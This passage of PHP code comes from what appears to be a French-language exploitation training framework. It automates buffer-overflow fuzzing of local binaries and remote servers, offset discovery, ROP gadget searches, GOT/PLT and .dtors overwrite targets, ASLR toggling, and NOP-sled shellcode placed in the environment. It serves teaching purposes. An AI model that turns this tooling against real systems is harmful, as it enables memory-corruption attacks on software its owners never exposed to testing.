	public function elf2addr4content_strings($hex,$argv) {
	$hex = trim($hex);
	$argv = trim($argv);
	$this->titre("Content in $hex with STRINGS display");
	$hex = $this->hex2norme_32($hex);
	$query = "gdb -q --batch -ex \"b main\" -ex \"r $argv\" -ex \"x/s $hex\" $this->file_path | tail -1";
	$this->requette($query);
	return trim($this->req_ret_str("$query | cut -d':' -f2"));
	}
	
	public function elf2addr4content_instructions($addr, $n_inst, $argv) {
	$addr = trim($addr);
	$argv = trim($argv);
	$this->titre("Addr Content in $n_inst Instruction(s)");
	$addr = $this->hex2norme_32($addr);
	$query = "gdb -q --batch -ex 'b main' -ex 'r $argv' -ex 'x/$n_inst" . "i $addr' $this->file_path | tail -$n_inst";
	$this->requette($query);
	exec("$query | cut -d':' -f2", $inst);
	return $inst;
	}
	public function elf2display4args($run){
	    $this->ssTitre(__FUNCTION__);
	    $requette = "gdb -q --batch $this->file_path -ex \"b main\" -ex \"r \$($run)\" -ex \"show args\" $this->file_path ";
	    return $this->req_ret_str($requette);
	}
	
	public function elf2display4signal($run){
	    $this->ssTitre(__FUNCTION__);
	    $requette = "gdb -q --batch $this->file_path -ex \"b main\" -ex \"r \$($run)\" -ex \"info signals\" $this->file_path ";
	    return $this->req_ret_str($requette);
	}
	public function elf2display4load_lib($run){
	    $this->ssTitre(__FUNCTION__);
	    $requette = "gdb -q --batch $this->file_path -ex \"b main\" -ex \"r \$($run)\" -ex \"catch load\" $this->file_path ";
	    return $this->req_ret_str($requette);
	}
	public function elf2display4threads($run){
	    $this->ssTitre(__FUNCTION__);
	    $requette = "gdb -q --batch $this->file_path -ex \"b main\" -ex \"r \$($run)\" -ex \"info threads\" $this->file_path ";
	    return $this->req_ret_str($requette);
	}
	
	
	public function elf2display4env($run){
	    $this->ssTitre(__FUNCTION__);
	    $requette = "gdb -q --batch $this->file_path -ex \"b main\" -ex \"r \$($run)\" -ex \"show env\" $this->file_path ";	    
	   return $this->req_ret_str($requette);
	}
	// ============= Fuzzeling =====================================
	public function elf2fuzzeling($argv,$argv2) {
	    // journalctl -xe
	$this->titre("Fuzzing:");
	$this->titre("Methode 1");
	$deb = 2;
	for($overflow = $deb;$overflow<131072;$overflow = $overflow * 2) {
	$check = rand(41, 59);
	$requette = "gdb -q --batch $this->file_path  -ex \"r $argv `python -c 'print \"\\x$check\"*$overflow+\" $argv2\"'` \" | grep  'Program received signal'  ";
	echo "\tSend \033[33;1m$overflow\033[0m bytes  --> $requette\n";
	exec($requette, $tmp_resu);
	if (! empty($tmp_resu)) {
	    echo "\t".$this->rouge("Provoquer le débordement overflow")." -> send max data(ici \033[33;1m$overflow\033[0m caracteres)\n";
	return $this->elf2offset4gdb($argv,$argv2,$overflow/2, $overflow);
	                           }
	                                                                   }
	}
	// =============================================================
	
	public function elf2display4memory8error($run,$offset_eip){
	    $requette = "gdb -q --batch $this->file_path -ex \"b free\" -ex \"r \$($run) `python -c 'print \"\\x41\"*$offset_eip+\"\\x42\"+\"\\x43\"+\"\\x44\"+\"\\x45\"'`\" | grep  '$this->file_path' | grep 'Error in' | grep -Po \"0x[0-9a-fA-F]{7,8}\" ";
	    $addr2display = $this->req_ret_str($requette);
	    $this->requette("echo \"b free\\nr $argv `python -c 'print \"\\x41\"*$offset_eip+\"\\x42\"+\"\\x43\"+\"\\x44\"+\"\\x45\"'`\\ninfo proc mappings\\nc\\ninfo proc mappings\\ni r\\n\" > $this->file_dir/cmd_gdb.txt");
	    $this->requette("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path | grep  '$this->file_path' | grep 'Error in' | grep -Po \"0x[0-9a-fA-F]{7,8}\" ");

	    
	    
	}
	// ============= Fuzzeling =====================================
	public function elf2fuzz4add($add,$option) {
	$this->titre("Fuzzing:");
	$this->titre("Methode 1");
	for($overflow = 14;;) {
	$check = rand(41, 59);
	$check_fuzz = "$this->file_path `python -c 'print \"\x$check\"*$overflow'` $option";
	$this->requette($check_fuzz);
	sleep(1);
	$requette = "dmesg | tail -1 | grep '$check$check$check$check'  | grep '$this->file_name'";
	echo "\tSend \033[33;1m$overflow\033[0m bytes  --> $requette\n";
	exec($requette, $tmp_resu);
	if (! empty($tmp_resu)) {
	echo "\t\033[32;1mProvoquer le débordement overflow\033[0m -> send max data(ici \033[33;1m$overflow\033[0m caracteres)\n";
	return $overflow;
	}
	$overflow = $overflow + $add;
	}
	}
	// =============================================================
	
	
	// ============= Fuzzeling =====================================
	public function elf2fuzzeling_integer($pre_argv, $option) {
	$this->titre("Fuzzeling:");
	for($overflow = 24;;) {
	$check = rand(41, 59);
	$check_fuzz = "$this->file_path $pre_argv `python -c 'print \"\x$check\"*$overflow'` $option";
	$this->requette($check_fuzz);
	sleep(1);
	$requette = "dmesg | tail -1 | grep $check$check$check$check  | grep '$this->file_name'";
	echo "\tSend \033[33;1m$overflow\033[0m bytes  --> $requette\n";
	exec($requette, $tmp_resu);
	if (! empty($tmp_resu)) {
	echo "\t\033[32;1mProvoquer le débordement overflow\033[0m -> send max data(ici \033[33;1m$overflow\033[0m caracteres)\n";
	return $overflow;
	}
	$overflow = $overflow + 256;
	}
	}
	// =============================================================
	
	
	
	
	// ============= Fuzzeling =====================================
	public function elf2fuzzeling_server($host, $port) {
	$this->titre("Fuzzeling Server");
	for($overflow = 24;;) {
	$check = rand(41, 59);
	$check_fuzz = "python -c 'print \"\x$check\"*$overflow' | nc $host $port -v";
	$this->requette($check_fuzz);
	sleep(1);
	$requette = "dmesg | tail -1 | grep $check$check$check$check  | grep '$this->file_name'";
	echo "\tSend \033[33;1m$overflow\033[0m bytes  --> $requette\n";
	exec($requette, $tmp_resu);
	if (! empty($tmp_resu)) {
	echo "\t\033[32;1mProvoquer le débordement overflow\033[0m -> send max data(ici \033[33;1m$overflow\033[0m caracteres)\n";
	return $overflow;
	}
	$overflow = $overflow + 256;
	}
	}
	// =============================================================
	
	
	
	public function elf2esp_ebp4diff() {
	if (! file_exists("$this->file_dir/find_esp"))
	$file_c = new file("$this->dir_c/find_esp.c");$file_c->c2bin("-m32");
	if (! file_exists("$this->file_dir/find_ebp"))
	$file_c = new file("$this->dir_c/find_ebp.c");$file_c->c2bin("-m32");
	$this->img("$this->dir_img/bof/image006.png");
	$this->img("$this->dir_img/bof/image007.png");
	$this->os2aslr4no();
	$this->elf2esp_ebp();
	$this->pause();
	$this->os2aslr4yes();
	$this->elf2esp_ebp();
	}
	
	
	
	public function elf2esp_ebp() {
	$query = "$this->file_dir/find_esp | cut -d : -f 2";
	cmd("localhost", $query);
	exec($query, $resu_esp);
	$esp = trim($resu_esp [0]);
	$this->article("ESP", "$esp");
	$query = "$this->file_dir/find_ebp | cut -d : -f 2";
	cmd("localhost", $query);
	exec($query, $resu_ebp);
	$ebp = trim($resu_ebp [0]);
	$this->article("EBP", "$ebp");
	$query = "printf \"%x HEX = %d DEC\" $(($esp - $ebp)) $(($esp - $ebp))";
	cmd("localhost", $query);
	exec($query, $resu_diff);
	$elf2esp_ebp4diff = $resu_diff [0];
	$this->article("DIFF", "$elf2esp_ebp4diff");
	}
	
	
	
	public function elf2addr4string_content_display_large($cmd) {
	$cmd = trim($cmd);
	$tmp = $this->elf2string4hex($cmd,"AA");
	$taille = strlen($tmp) - 1;
	$this->requette("gdb --batch -q -ex \"r AA\" -ex \"x/$taille" . "c $cmd\" $this->file_path | tail -1");
	$this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/6s $cmd-" . ($taille + 6) . "\" $this->file_path | tail -6 | grep '0x' ");
	}
	
	public function elf2addr4fonction_prog_ld_preload($load_lib,$fonction) {
	$query = "LD_PRELOAD=$this->file_dir/$load_lib gdb --batch -q -ex \"r AAAA\" -ex \"x/x $fonction\" $this->file_path";
	$filtre = " | tail -1 | cut -d'x' -f2 | cut -d' ' -f1 ";
	// $this->requette($query);
	$tmp = $this->req_ret_tab($query.$filtre);
	$fonction_addr = trim($tmp [0]);unset($tmp);
	$fonction_addr = $this->hex2norme_32($fonction_addr);
	$this->article("&$fonction", $fonction_addr);
	return $fonction_addr;
	}
	
	
	public function elf2pop1ret4all($reg,$dll) {
		$this->ssTitre("POP1RET ALL");
	$reg = trim($reg);
	$dll = trim($dll);
	$file_output = "$this->file_dir/$this->file_name.all.pop1ret";
	if(!file_exists($file_output)) {
	if ($dll == "all") {
	$dlls = $this->elf2dlls();
	if (! empty($dlls)) foreach($dlls as $dll_path) $this->elf2addr4pop1($reg,$dll_path);
	} else $this->elf2addr4pop1($reg,$dll);
	}
	
	$this->elf2addr4pop1($reg,$this->file_path);
	$this->requette("cat $this->file_dir/$this->file_name.*.all.pop1ret | sort -u > $file_output  ");
	$this->note("enlever des POP dans ce fichier si vous voulez juste qlq exemples");
	$this->requette("gedit $file_output");
	$this->pause();
	return file($file_output);
	}
	
	public function elf2pop2ret4all($dll) {
		$this->ssTitre("POP2RET ALL");
	$dll = trim($dll);
	$file_output = "$this->file_dir/$this->file_name.all.pop2ret";
	if(!file_exists($file_output)) {
	if ($dll == "all") {
	$dlls = $this->elf2dlls();
	if (! empty($dlls)) foreach($dlls as $dll_path) $this->elf2addr4pop2($dll_path);
	} else $this->elf2addr4pop2($dll);
	}
	$this->elf2addr4pop2($this->file_path);
    $this->requette("cat $this->file_dir/$this->file_name.*.all.pop2ret | sort -u > $file_output  ");
	//$this->remarque("enlever des POP dans ce fichier si vous voulez juste qlq exemples");
	$this->requette("gedit $file_output");
	return file($file_output);
	}
	
	public function elf2pop3ret4all($dll) {
		$this->ssTitre("POP3RET ALL");
	$reg = trim($reg);
	$dll = trim($dll);
	$file_output = "$this->file_dir/$this->file_name.all.pop3ret";
	if(!file_exists($file_output)) {
	if ($dll == "all") {
	$dlls = $this->elf2dlls();
	if (! empty($dlls)) foreach($dlls as $dll_path) $this->elf2addr4pop3($dll_path);
	} else $this->elf2addr4pop3($dll);
	}
	$this->elf2addr4pop3($this->file_path);
	$this->requette("cat $this->file_dir/$this->file_name.*.all.pop3ret | sort -u > $file_output  ");
	//$this->remarque("enlever des POP dans ce fichier si vous voulez juste qlq exemples");
	$this->requette("gedit $file_output");
	return file($file_output);
	}
	
	public function elf2pop8ret4all($dll) {
		$this->ssTitre("POP8RET ALL");
	$dll = trim($dll);
	$file_output = "$this->file_dir/$this->file_name.all.pop8ret";
	if(!file_exists($file_output)) {
	if ($dll == "all") {
	$dlls = $this->elf2dlls();
	if (! empty($dlls)) foreach($dlls as $dll_path) $this->elf2addr4pop8($dll_path);
	} else $this->elf2addr4pop8($dll);
	}
	$this->elf2addr4pop8($this->file_path);
	$this->pause();
	$this->requette("cat $this->file_dir/$this->file_name.*.all.pop8ret | sort -u > $file_output  ");
	//$this->remarque("enlever des POP dans ce fichier si vous voulez juste qlq exemples");
	$this->requette("gedit $file_output");
	return file($file_output);
	}
	
	

	
	
	
	
	
	
	
	public function elf2eip4before($offset) { // before_eip_addr($offset)
	$display = $offset / 2;
	$this->requette ( "gdb --batch -q -ex 'b main' -ex \"r `python -c 'print \"\\x90\"*$offset+\"BBBB\"'` \" -ex \"x/x argv[1]\" $this->file_path" );
	$query = "gdb --batch -q -ex 'b main' -ex \"r `python -c 'print \"\\x90\"*$offset+\"BBBB\"'` \" -ex \"x/$display" . "x \\\$esp\" $this->file_path | grep -m2 '0x90909090' | tail -1 | cut -d':' -f1";
	return $this->req_ret_str( $query );
	}
	
	public function elf2reg4jmp($reg,$dll) { // elf2jmp_local($reg,$dll)
	$this->ssTitre("GET Local (JMP $reg OR PUSH $reg ret) from $this->file_path with specific Library $dll");
	$dll = trim($dll);
	$reg = trim($reg);
	$file_output = "$this->file_dir/$this->file_name.all.$reg";
	if(!file_exists($file_output))  {
	
	if ($dll == "all") {
	$dlls = $this->elf2dlls();
	if (! empty($dlls)) 
	    foreach($dlls as $dll_path) 
	        if (!empty($dll_path)) $this->elf2addr4reg4jmp2lib($reg,$dll_path);
	} else $this->elf2addr4reg4jmp2lib($reg,$dll);
	}
	$this->pause();
	$this->elf2addr4reg4jmp2lib($reg,$this->file_path);
	$this->pause();
	

	$this->requette("cat $this->file_dir/$this->file_name.so.*.all.$reg | sort -u > $file_output  ");
	//$this->remarque("enlever des $reg dans ce fichier si vous voulez juste qlq exemples");
	$this->requette("gedit $file_output");
	$this->pause();
	return file($file_output);
	}
	
	public function elf2addr4reg4jmp2lib($reg,$dll_path){
	$reg = trim($reg);
	$tab_new_addr = array();
	if (!empty($dll_path)){	
	    $dll_name = trim(basename($dll_path));
	    $file_output = "$this->file_dir/$this->file_name.so.$dll_name.all.$reg";
	    
	if(file_exists($file_output))  return file($file_output);
	$this->requette("ropper --jmp $reg --file $dll_path  | grep $reg | grep -Po \"0x[0-9a-fA-F]{7,8}\" > $this->file_dir/$this->file_name.so.$dll_name.ropper.$reg  ");
	$this->requette("/usr/share/framework2/msfelfscan -j $reg -f $dll_path  | grep $reg  | grep -Po \"0x[0-9a-f-A-F]{6,8}\" > $this->file_dir/$this->file_name.so.$dll_name.msfelfscan.$reg  " );
	$start_lib_addr = $this->elf2addr4lib_start($dll_path);
	$this->requette("cat $this->file_dir/$this->file_name.so.$dll_name.ropper.$reg $this->file_dir/$this->file_name.so.$dll_name.msfelfscan.$reg | sort -u > $this->file_dir/$this->file_name.so.$dll_name.tmp.$reg");
	$tab_rst = file("$this->file_dir/$this->file_name.so.$dll_name.tmp.$reg");
	
	foreach ($tab_rst as $jump_reg)
	$tab_new_addr[] = $this->addr2add4hex($start_lib_addr,$jump_reg);
	
	return $this->tab2file($tab_new_addr,$file_output);
	}
	}
	
	public function elf2addr4pop1($reg,$dll_path){
	$reg = trim($reg);
	$dll_name = trim(basename($dll_path));
	$file_output = "$this->file_dir/$this->file_name.$dll_name.all.pop1ret";
	//if(file_exists($file_output))  return file($file_output);
	$this->requette("objdump -M intel -d $dll_path | grep pop -A1 | grep ret -B1 | grep pop | cut -d':' -f1  > $this->file_dir/$this->file_name.$dll_name.objdump.pop1ret  ");
	$this->requette("ropper --search \"pop $reg; ret;\" --file $dll_path | grep pop  | grep -Po \"0x[0-9a-fA-F]{7,8}\" | grep -v -E \"(00\$|20\$|0a\$)\" | sort -u > $this->file_dir/$this->file_name.$dll_name.ropper.pop1ret  ");
	$start_lib_addr = $this->elf2addr4lib_start($dll_path);
	$tab_rst = file("$this->file_dir/$this->file_name.$dll_name.ropper.pop1ret");
	$tab_new_addr = array();
	foreach ($tab_rst as $jump_reg)
	$tab_new_addr[] = $this->addr2add4hex($start_lib_addr,$jump_reg);
	return $this->tab2file($tab_new_addr,$file_output);
	}
	
	public function elf2addr4pop2($dll_path){
	$this->ssTitre("POP POP RET -> $dll_path");
	$dll_name = trim(basename($dll_path));
	$file_output = "$this->file_dir/$this->file_name.$dll_name.all.pop2ret";
	if(file_exists($file_output))  return file($file_output);
	$this->requette("objdump -M intel -d $dll_path | grep pop -A2 | grep ret -B2 > $this->file_dir/$this->file_name.$dll_name.objdump.pop2ret");
	$this->requette("/usr/share/framework2/msfelfscan --poppopret $dll_path > $this->file_dir/$this->file_name.$dll_name.msfelfscan.pop2ret");
	$this->requette("ropper --ppr --file $dll_path > $this->file_dir/$this->file_name.$dll_name.ropper.pop2ret");
	$this->requette("cat $this->file_dir/$this->file_name.$dll_name.msfelfscan.pop2ret $this->file_dir/$this->file_name.$dll_name.ropper.pop2ret | grep pop  | grep -Po \"0x[0-9a-fA-F]{7,8}\" | grep -v -E \"(00\$|20\$|0a\$)\" | sort -u > $this->file_dir/$this->file_name.$dll_name.pop2ret  ");
	
	$start_lib_addr = $this->elf2addr4lib_start($dll_path);
	$tab_rst = file("$this->file_dir/$this->file_name.$dll_name.pop2ret");
	$tab_new_addr = array();
	foreach ($tab_rst as $jump_reg)
	$tab_new_addr[] = $this->addr2add4hex($start_lib_addr,$jump_reg);
	
	return $this->tab2file($tab_new_addr,$file_output);
	}
	
	public function elf2addr4pop3($reg,$dll_path){
	$reg = trim($reg);
	$dll_name = trim(basename($dll_path));
	$file_output = "$this->file_dir/$this->file_name.$dll_name.all.pop3ret";
	if(file_exists($file_output))  return file($file_output);
	$this->requette("objdump -M intel -d $dll_path | grep pop -A3 | grep ret -B3 > $this->file_dir/$this->file_name.$dll_name.objdump.pop2ret");
	
	$this->requette("ropper --search \"pop ???; pop ???; pop ???; ret\" --file $dll_path | grep pop  | grep -Po \"0x[0-9a-fA-F]{7,8}\" | grep -v -E \"(00\$|20\$|0a\$)\" | sort -u > $this->file_dir/$this->file_name.$dll_name.pop3ret  ");
	$start_lib_addr = $this->elf2addr4lib_start($dll_path);
	$tab_rst = file("$this->file_dir/$this->file_name.$dll_name.pop3ret");
	$tab_new_addr = array();
	foreach ($tab_rst as $jump_reg)
	$tab_new_addr[] = $this->addr2add4hex($start_lib_addr,$jump_reg);
	
	return $this->tab2file($tab_new_addr,$file_output);
	
	}
	public function elf2addr4pop8($dll_path){
	$dll_name = trim(basename($dll_path));
	$file_output = "$this->file_dir/$this->file_name.$dll_name.all.pop8ret";
	if(file_exists($file_output))  return file($file_output);
	$this->requette("ropper --search \"popad ret\" --file $dll_path | grep pop  | grep -Po \"0x[0-9a-fA-F]{7,8}\" | grep -v -E \"(00\$|20\$|0a\$)\" | sort -u > $this->file_dir/$this->file_name.$dll_name.pop8ret  ");
	$start_lib_addr = $this->elf2addr4lib_start($dll_path);
	$tab_rst = file("$this->file_dir/$this->file_name.$dll_name.pop8ret");
	$tab_new_addr = array();
	foreach ($tab_rst as $jump_reg)
	$tab_new_addr[] = $this->addr2add4hex($start_lib_addr,$jump_reg);
	
	return $this->tab2file($tab_new_addr,$file_output);
	
	}
	
	public function elf2dlls() {
	$this->titre("Find Shared Or dynamic library ");
	return $this->req_ret_tab("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r \" -ex \"info proc mappings\" | grep '0x' | grep -Po \"/[[:print:]]*\.so[[:print:]]*\" | sort -u | tee $this->file_dir/$this->file_name.dlls");
	}
	
	
	public function elf2addr4fonction_plt($fonction) {
	$all_plt = array();
	$this->titre("Addr of $fonction@plt");
	$tmp = $this->req_ret_tab("gdb --batch -q -ex \"info functions\" $this->file_path | grep '$fonction@plt' | cut -d' ' -f1 | grep -Po \"0x[0-9a-f]{7,8}\" ");
	$fonction_plt = trim($tmp [0]);	unset($tmp);
	$fonction_plt = $this->hex2norme_32($fonction_plt);
	$this->elf2symbol4hex($fonction_plt);
	$this->article("$fonction@plt", $fonction_plt);
	return $fonction_plt;
	}
	public function elf2addr4fonction_got($fonction) {
	$fonction_plt = $this->elf2addr4fonction_plt($fonction);
	$this->titre("Addr of $fonction@got");
	$query = "gdb --batch -q  -ex \"disas $fonction_plt\" $this->file_path";
	$this->requette($query);
	$tmp = $this->req_ret_tab(" $query  | grep '$fonction_plt'  | cut -d'*' -f2 | grep -Po \"0x[0-9a-f]{7,8}\" ");
	$fonction_got = trim($tmp [0]);	unset($tmp);
	$fonction_got = $this->hex2norme_32($fonction_got);
	$this->elf2symbol4hex($fonction_got);
	$this->article("$fonction@got", $fonction_got);
	return $fonction_got;
	}
	public function elf2addr4got_all() {
	$this->titre("Addr All GOT Reverse");
	$tab_got_addr = [];
	$this->requette("objdump -R $this->file_path | grep SLOT | cut -d' ' -f1,5 | egrep \"* [_a-z]\" | tac");
	$fonctions_addrs = $this->req_ret_tab("objdump -R $this->file_path | grep SLOT | cut -d' ' -f1,5 | egrep \"* [_a-z]\" | tac | cut -d '@' -f1 ");
	foreach ($fonctions_addrs as $fonction_addr){
	    list($addr,$fonction) = explode(" ",$fonction_addr) ;
	    $this->ssTitre("$fonction@$addr");
	    $this->elf2addr4got_function($fonction," | grep '$addr' ");
	    $tab_got_addr += [$addr=>$fonction] ;
	}
	return $tab_got_addr;
	}
	
	
	public function elf2addr4got_function($fonction) {
	    $this->ssTitre("Addr GOT FOR fonction: $fonction");
	    $this->requette("objdump -R $this->file_path | grep SLOT | cut -d' ' -f1,5 | grep -i '$fonction' | tac ");
	    
	    $fonction_addr = $this->req_ret_str("objdump -R $this->file_path | grep SLOT | cut -d' ' -f1,5 | grep -i '$fonction' | tac | grep -Po \"^[0-9a-f]{7,8}\" ");
	    $fonction_addr = $this->hex2norme_32($fonction_addr);
	    $this->elf2symbol4hex($fonction_addr);
	    return $fonction_addr;
	}
	
	public function elf2addr4opcode($hex) {
	$this->titre("Looking for 0x$hex");
	$tmp = trim($this->req_ret_str("ropper --nocolor --opcode \"$hex\" --file $this->file_path | grep 0x | cut -d':' -f1 | grep -v -E \"(20|00|0a)\" | head -1"));
	if(!empty($tmp) ) return $this->hex2norme_32($tmp);
	
	if (empty(trim($tmp))) {
	$dlls = $this->elf2dlls();
	$libc_start = $this->elf2addr4libc_start();
	$vals = $this->req_ret_tab("ropper --nocolor --opcode \"$hex\" --file $dlls[1] | grep 0x | cut -d':' -f1");
	foreach ($vals as $val)
	{
		$tmp3 = $this->addr2add($libc_start,hexdec($val));
		$this->article("Val check Libc: $libc_start + $val = ", $tmp3);
		if(!strstr($tmp3,"20") && !strstr($tmp3,"00")  && !strstr($tmp3,"a0") ) { 
			$bin2addr4opcode = $tmp3 ;
			return $this->hex2norme_32($bin2addr4opcode);
		}
	}
	
	$ld_start = $this->elf2addr4ld_start();
	
	$val2 = $this->req_ret_tab("ropper --nocolor --opcode \"$hex\" --file $dlls[0] | grep 0x | cut -d':' -f1");
	
	foreach ($val2 as $val)
	{
		$tmp2 = $this->addr2add($ld_start,hexdec($val));
		$this->article("Val check Ld: $ld_start + $val = ", $tmp2);
		if(!strstr($tmp2,"20") && !strstr($tmp2,"00")  && !strstr($tmp2,"a0") ) {			
			$bin2addr4opcode = $tmp2 ;
			return $this->hex2norme_32($bin2addr4opcode);
		}
	}
	
		
	} 
	
	
	
	
	return $this->rouge("Aucune valeur retourne ");
	}
	
	
	/*
	public function elf2addr4opcode($hex) {
		$this->titre("Looking for 0x$hex");
		$tmp = trim($this->req_ret_str("ropper --nocolor --opcode \"$hex\" --file $this->file_path | grep 0x | head -1 | cut -d':' -f1"));
		if (empty(trim($tmp))) {
			$dlls = $this->elf2dlls();
			$libc_start = $this->elf2addr4libc_start();
			$val = trim($this->req_ret_str("ropper --nocolor --opcode \"$hex\" --file $dlls[1] | grep 0x | tail -1 | cut -d':' -f1"));
			if (! empty($val)) $bin2addr4opcode = $this->addr2add($libc_start,hexdec($val));
			if (empty($val)) {
				$ld_start = $this->elf2addr4ld_start();
				$val2 = trim($this->req_ret_str("ropper --nocolor --opcode \"$hex\" --file $dlls[0] | grep 0x | tail -1 | cut -d':' -f1"));
				$bin2addr4opcode = $this->addr2add($ld_start,hexdec($val2));
			}
		} else 	$bin2addr4opcode = $tmp ;
	
		return $this->hex2norme_32($bin2addr4opcode);
	}
	*/

	/*
	public function elf2addr4opcode($hex) {
		$this->titre("Looking for 0x$hex");
		$addr_prog = trim($this->req_ret_str("ropper --nocolor --opcode \"$hex\" --file $this->file_path | grep 0x | cut -d':' -f1 | grep -v -E (20|00|0a) | head -1"));
		if (empty(trim($tmp))) {
			$dlls = $this->elf2dlls();
			$libc_start = $this->elf2addr4libc_start();
			$val = trim($this->req_ret_str("ropper --nocolor --opcode \"$hex\" --file $dlls[1] | grep 0x | tail -1 | cut -d':' -f1"));
			if (! empty($val)) $bin2addr4opcode = $this->addr2add($libc_start,hexdec($val));
			if (empty($val)) {
				$ld_start = $this->elf2addr4ld_start();
				$val2 = trim($this->req_ret_str("ropper --nocolor --opcode \"$hex\" --file $dlls[0] | grep 0x | tail -1 | cut -d':' -f1"));
				$bin2addr4opcode = $this->addr2add($ld_start,hexdec($val2));
			}
		} else 	$bin2addr4opcode = $tmp ;
	
		return $this->hex2norme_32($bin2addr4opcode);
	}
	*/
	
	
	
	
	public function elf2search_hex($search) {
	$this->titre("Searching Hex Value $search in $this->file_path");
	$tmp = $this->elf2mem();
	$start_mem = trim($tmp [0]);
	$end_mem = $tmp [1];
	$query = "gdb -q --batch -ex 'find /b $start_mem, $end_mem, $search' $this->file_path";
	return $this->req_ret_tab($query);
	}

	
	
	public function elf2addr4shell() {
	// $this->article("rbash","restricted bash");
	$this->titre("How to get a shell");
	$this->requette("ls -la /bin/ | grep sh ");
	$this->pause();
	$this->titre("Shell on my OS");
	$this->requette("cat /etc/shells");
	$this->pause();
	$this->article("Other Shell in other OS", "/sbin/nologin /bin/tcsh /bin/csh /bin/ksh /bin/ash pdksh mksh fish psh /usr/bin/es");
	$this->titre("List Unix Shell");
	$this->net("http://en.wikipedia.org/wiki/Shell_%28computing%29");
	$this->net("http://en.wikipedia.org/wiki/Unix_shell");
	$this->net("http://en.wikipedia.org/wiki/Comparison_of_command_shells");
	$this->net("http://en.wikipedia.org/wiki/List_of_command-line_interpreters");
	$this->net("http://www.faqs.org/faqs/unix-faq/shell/shell-differences/");
	$this->pause();
	}
	
	public function elf2addr4libc_end() {
	$this->titre("Libc End");
	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep -m1 \"/libc-2\" | cut -d' ' -f2"));
	}
	
	public function elf2addr4libc_start() {
	$this->titre("Libc Start");
	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep '0x0' | grep -m1 \"/libc-2\" | cut -d' ' -f1"));
	}
	
	public function elf2addr4ld_end() {
	$this->titre("Linked library End");
	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep -m1 \"/ld-2\" | cut -d' ' -f2"));
	}
	
	public function elf2addr4ld_start() {
	$this->titre("Linked library Start");
	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep '0x0' | grep -m1 \"/ld-2\" | cut -d' ' -f1"));
	}
	
	public function elf2addr4lib_end($lib) {
	$lib = trim($lib);
	$this->titre("$lib End");
	$obj_lib = new FILE($lib);	
	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep -m1 '$obj_lib->file_name' | cut -d' ' -f2"));
	}
	
	public function elf2addr4lib_start($lib) {
	$lib = trim($lib);
	$this->titre("$lib Start");
	$obj_lib = new FILE($lib);
	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep '0x0' | grep -m1 '$obj_lib->file_name' | cut -d' ' -f1"));
	}
	
	public function elf2addr4env_end() {
	$this->titre("env End");
	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep '\[stack\]' | cut -d' ' -f2 | grep -Po \"0x[0-9a-f]{4,8}\" "));
	}
	
	public function elf2addr4env_start() {
	$this->titre("env START");
	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep '\[stack\]' | cut -d' ' -f1 | grep -Po \"0x[0-9a-f]{4,8}\" "));
	}
	
	public function elf2fmt_env($nops, $shellcode_hex) {
	$this->titre("PUT FMT in ENV");
	$shell = str_repeat("\x90", $nops);
	$shell .= $shellcode_hex;
	// $shellcode_hex = shellcode_raw2hex($shellcode_raw);
	cmd("localhost", "export fmt=$shellcode_hex");
	putenv("fmt=$shell");
	//payload2check4norme($shellcode_hex);
	$this->titre("Check fmt in ENV");
	// $this->article("Remarque","Shellcode doit etre en raw");
	$this->requette("env | grep 'fmt' ");
	}
	public function elf2got() {
	$this->titre(".got (Global Offset Table entries)");
	$this->requette("objdump -d -j .plt $this->file_path | egrep \"@plt|jmp\" | egrep \"@plt|\*0x\" ");
	$this->pause();
	$this->article("Pourque cela fonctionne", "Nous devons alors savoir laquelle de ces fonctions est appeleé après notre printf vulnérable ou bien tester les differents adresses trouvées en commençant par la fin du programme");
	$this->pause();
	}
	public function elf2dtors() {
	$this->titre("Addresse to overwrite .dtors ");
	$this->requette("gdb -q --batch -ex 'maintenance info section .dtors' $this->file_path");
	$this->requette("size -Ax $this->file_path | grep '\.dtors' ");
	$this->requette("readelf -e $this->file_path | grep '\.dtors' | head -1");
	$this->requette("objdump -h $this->file_path | grep '\.dtors' ");
	$this->requette("objdump -d -j .dtors $this->file_path");
	$query = "nm $this->file_path | grep '__DTOR_END__' | cut -d' ' -f1";
	return $this->hex2norme_32(trim($this->req_ret_str($query)));
	}
	
	
	public function elf2plt2size() {
	$this->titre("Size PLT section");
	$this->titre("Via Size");
	$this->requette("size -Ax $this->file_path | grep '^.plt' ");
	exec("size -Ax $this->file_path | grep '^.plt' | tail -1 | sed \"s/.plt//g\" | sed \"s/  //g\" | cut -d' ' -f1", $tmp1);
	exec("size -Ax $this->file_path | grep '^.plt' | tail -1 | sed \"s/.plt//g\" | sed \"s/  //g\" | cut -d' ' -f2", $tmp2);
	$elf2addr4tmp = sprintf("%x", $tmp2 [0] + $tmp1 [0]);
	echo "\n\tZone TEXT: start: $tmp2[0] (Size: $tmp1[0]) end: 0x$elf2addr4tmp\n";
	$this->titre("Via ReadElf");$this->requette("readelf -e $this->file_path | grep '.plt' -m2 | tail -1");
	$this->titre("Via Objdump");$this->requette("objdump -h $this->file_path | grep '.plt' -m2 | tail -1");
	$this->titre("Via GDB");$this->requette("gdb -q --batch -ex 'maintenance info section .plt' $this->file_path | tail -1");
	}
	public function elf2dtors2size() {
